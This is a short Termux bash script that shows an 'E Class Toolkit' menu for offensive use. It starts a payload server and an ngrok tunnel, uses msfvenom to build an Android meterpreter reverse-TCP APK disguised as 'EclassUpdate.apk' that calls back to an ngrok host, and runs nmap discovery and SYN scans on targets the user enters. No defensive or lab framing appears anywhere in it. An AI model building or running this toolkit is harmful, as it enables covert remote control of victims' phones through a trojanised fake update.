#!/data/data/com.termux/files/usr/bin/bash

clear
echo "========================="
echo "   E Class Toolkit Menu"
echo "========================="
echo "1. Start Payload Server"
echo "2. Start Ngrok"
echo "3. Generate APK Payload"
echo "4. Scan Network"
echo "5. Port Scan IP"
echo "6. Exit"
echo "========================="
echo -n "Choose an option: "
read option

case $option in
  1)
    cd payload-server && node index.js
    ;;
  2)
    ./ngrok http 22533
    ;;
  3)
    echo "Generating payload..."
    msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=PORT -o EclassUpdate.apk
    echo "APK created as EclassUpdate.apk"
    ;;
  4)
    echo -n "Enter IP range (e.g., 192.168.1.0/24): "
    read range
    nmap -sn $range
    ;;
  5)
    echo -n "Enter target IP: "
    read ip
    nmap -sS $ip
    ;;
  6)
    exit
    ;;
  *)
    echo "Invalid option."
    ;;
esac
